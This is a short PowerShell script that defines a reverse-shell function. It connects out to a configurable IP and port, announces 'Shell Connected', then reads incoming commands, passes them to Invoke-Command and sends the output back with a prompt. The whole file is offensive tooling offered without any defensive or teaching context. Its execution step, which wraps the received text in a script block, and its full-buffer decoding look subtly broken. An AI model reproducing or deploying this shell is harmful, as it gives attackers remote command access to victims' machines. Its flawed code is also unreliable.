using namespace System.Text;
using namespace System.Net.Sockets;

Function Start-ReverseShell {
    param (
        [string]$IP = "127.0.0.1" ,
        [string]$Port = "8080"
    )
    
    try {
        # Create a TCP client and connect to the remote host
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | ForEach-Object {0}

        # Send a connection confirmation
        $sendbytes = ([text.encoding]::UTF8).GetBytes('Shell Connected: ' + (Get-Date).ToString() + "`n")
        $stream.Write($sendbytes, 0, $sendbytes.Length)
        
        # Enter a loop to receive commands from the remote host and execute them
        while ($stream -and $stream.Read($bytes, 0, $bytes.Length) -ne 0) {

            # Convert the received bytes to a string
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $bytes.Length)
            try {
                $sendback = Invoke-Command -ScriptBlock { $data } 2>&1 | Out-String
            }
            catch {
                $sendback = $_.Exception.Message
            }

            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '>'
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        
    }
    finally {
        # Close the connection
        if ($client) {
            $client.Close();
        }
    }
}
